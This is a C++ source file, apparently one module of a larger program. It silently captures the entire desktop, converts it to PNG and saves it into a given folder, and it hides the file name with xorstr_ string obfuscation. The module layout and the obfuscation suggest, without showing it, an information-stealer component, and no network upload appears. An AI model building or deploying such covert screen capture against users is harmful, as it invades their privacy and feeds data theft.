//
// Created by .1qxz on 06.06.2024.
//

#include "Screenshot.h"
#include "Windows.h"

static const int decodeBMP(std::vector<unsigned char>& image, unsigned& w, unsigned& h, const std::vector<unsigned char>& bmp) {
    static const unsigned MINHEADER = 54;

    if(bmp.size() < MINHEADER) return -1;
    if(bmp[0] != 'B' || bmp[1] != 'M') return 1;
    unsigned pixeloffset = bmp[10] + 256 * bmp[11];
    w = bmp[18] + bmp[19] * 256;
    h = bmp[22] + bmp[23] * 256;
    if(bmp[28] != 24 && bmp[28] != 32) return 2;
    unsigned numChannels = bmp[28] / 8;

    unsigned scanlineBytes = w * numChannels;
    if(scanlineBytes % 4 != 0) scanlineBytes = (scanlineBytes / 4) * 4 + 4;

    unsigned dataSize = scanlineBytes * h;
    if(bmp.size() < dataSize + pixeloffset) return 3;

    image.resize(w * h * 4);

    for(unsigned y = 0; y < h; y++)
        for(unsigned x = 0; x < w; x++) {
            unsigned bmpos = pixeloffset + (h - y - 1) * scanlineBytes + numChannels * x;
            unsigned newpos = 4 * y * w + 4 * x;
            if(numChannels == 3) {
                image[newpos + 0] = bmp[bmpos + 2]; //R
                image[newpos + 1] = bmp[bmpos + 1]; //G
                image[newpos + 2] = bmp[bmpos + 0]; //B
                image[newpos + 3] = 255;            //A
            } else {
                image[newpos + 0] = bmp[bmpos + 2]; //R
                image[newpos + 1] = bmp[bmpos + 1]; //G
                image[newpos + 2] = bmp[bmpos + 0]; //B
                image[newpos + 3] = bmp[bmpos + 3]; //A
            }
        }
    return 0;
}

void Screenshot::execute(fs::path& root) {

    std::vector<unsigned char> bmpData;
    fs::path screenshot = root / xorstr_("Screenshot.png");

    BITMAPFILEHEADER bfHeader;
    BITMAPINFOHEADER biHeader;
    BITMAPINFO bInfo;
    BITMAP bAllDesktops;
    HGDIOBJ hTempBitmap;
    HBITMAP hBitmap;
    HDC hDC, hMemDC;
    LONG lWidth, lHeight;
    BYTE* bBits = nullptr;
    DWORD cbBits;

    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    hDC = GetDC(NULL);

    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);

    lWidth = bAllDesktops.bmWidth;
    lHeight = bAllDesktops.bmHeight;

    DeleteObject(hTempBitmap);

    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
    bfHeader.bfType = (WORD)('B' | ('M' << 8));
    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
    biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biBitCount = 24;
    biHeader.biCompression = BI_RGB;
    biHeader.biPlanes = 1;
    biHeader.biWidth = lWidth;
    biHeader.biHeight = lHeight;

    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
    bInfo.bmiHeader = biHeader;

    cbBits = (((24 * lWidth + 31) & ~31) / 8) * lHeight;

    hMemDC = CreateCompatibleDC(hDC);
    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID**)&bBits, NULL, 0);
    SelectObject(hMemDC, hBitmap);

    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);
    bmpData.insert(bmpData.end(), reinterpret_cast<unsigned char*>(&bfHeader), reinterpret_cast<unsigned char*>(&bfHeader) + sizeof(BITMAPFILEHEADER));
    bmpData.insert(bmpData.end(), reinterpret_cast<unsigned char*>(&biHeader), reinterpret_cast<unsigned char*>(&biHeader) + sizeof(BITMAPINFOHEADER));
    bmpData.insert(bmpData.end(), bBits, bBits + cbBits);

    DeleteDC(hMemDC);
    ReleaseDC(NULL, hDC);
    DeleteObject(hBitmap);

    std::vector<unsigned char> image;
    unsigned w, h;
    unsigned error = decodeBMP(image, w, h, bmpData);

    std::vector<unsigned char> png;
    error = lodepng::encode(png, image, w, h);

    std::ofstream out(screenshot, std::ios::out | std::ios::binary);
    out.write(reinterpret_cast<const char*>(png.data()), png.size());
    out.close();
}
